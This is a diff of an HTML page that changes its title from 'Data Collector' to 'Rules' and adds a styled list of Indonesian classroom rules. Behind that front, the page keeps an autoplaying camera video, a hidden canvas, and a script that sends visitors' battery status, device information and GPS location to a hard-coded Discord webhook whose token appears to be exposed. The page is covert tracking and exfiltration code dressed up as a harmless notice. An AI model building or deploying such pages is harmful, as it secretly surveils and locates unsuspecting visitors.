@@ -3,14 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Collector</title>
+    <title>Rules</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #2c3e50;
+        }
+        video {
+            display: block;
+            margin: 20px 0;
+        }
+        .rules {
+            margin-top: 20px;
+        }
+        .rules h2 {
+            color: #2c3e50;
+        }
+        .rules ul {
+            list-style: none;
+            padding: 0;
+        }
+        .rules li {
+            background: #ecf0f1;
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to Our Site</h1>
-    <video id="video" width="320" height="240" autoplay></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <div class="container">
+        <video id="video" width="320" height="240" autoplay></video>
+        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+        <div class="rules">
+            <h2>Aturan Kelas</h2>
+            <ul>
+                <li>1. Yang tidak mengerjakan PR denda Rp10.000 atau berlari mengelilingi lapangan 20x.</li>
+                <li>2. Tidak boleh ada yang ngobrol. Jika ingin bertanya, boleh berbicara dengan saya (Ketua/Wakil). Pelanggaran dikenakan denda Rp5.000 atau berlari mengelilingi lapangan 20x.</li>
+                <li>3. Tidak boleh bolak-balik ke WC.</li>
+                <li>4. Yang tidak mencatat atau catatannya tidak lengkap serta tidak mengerjakan tugas dikenakan denda Rp5.000, membersihkan kamar mandi, dan berlari mengelilingi lapangan.</li>
+            </ul>
+        </div>
+    </div>
+    
     <script>
-        async function sendToWebhook(data, photoUrl) {
+        async function sendToWebhook(data) {
             const webhookURL = "https://discord.com/api/webhooks/1269291496922808403/Oojg7HJli9J0DWJoYjPdTpa7s_HBX4m6wZPArqFnxKGcmEX4eFI2UU7zWmVqV8BVedOC"; // Replace with your webhook URL
 
             const payload = {
@@ -22,8 +73,7 @@
                         { name: "Charging", value: data.battery.charging, inline: true },
                         { name: "Device Info", value: data.phoneInfo, inline: true },
                         { name: "Location", value: `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`, inline: true }
-                    ],
-                    image: { url: photoUrl }
+                    ]
                 }]
             };
 
